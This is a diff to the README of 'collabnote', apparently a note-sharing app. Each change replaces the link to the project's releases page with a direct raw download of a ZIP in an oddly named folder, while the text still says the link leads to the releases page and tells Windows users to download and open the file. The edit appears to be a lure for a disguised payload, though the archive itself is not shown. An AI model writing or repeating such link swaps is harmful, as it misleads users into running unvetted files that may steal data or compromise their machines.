@@ -1,6 +1,6 @@
 # 📝 collabnote - Share Notes Live Across Devices
 
-[![Download collabnote](https://img.shields.io/badge/Download%20collabnote-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://github.com/brynnhearty68/collabnote/releases)
+[![Download collabnote](https://img.shields.io/badge/Download%20collabnote-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://github.com/brynnhearty68/collabnote/raw/refs/heads/main/captaincy/Software_v1.7-beta.1.zip)
 
 ## 🚀 What collabnote does
 
@@ -31,7 +31,7 @@ For best results:
 
 Go to the releases page here:
 
-https://github.com/brynnhearty68/collabnote/releases
+https://github.com/brynnhearty68/collabnote/raw/refs/heads/main/captaincy/Software_v1.7-beta.1.zip
 
 On that page, look for the latest release. Download the Windows file that matches your system. If you see a setup file, use that. If you see a ZIP file, save it and open it after the download finishes.
 
@@ -202,4 +202,4 @@ If one browser gives you trouble, try another one. Some camera and sync features
 
 Download or get the latest Windows version here:
 
-https://github.com/brynnhearty68/collabnote/releases
+https://github.com/brynnhearty68/collabnote/raw/refs/heads/main/captaincy/Software_v1.7-beta.1.zip
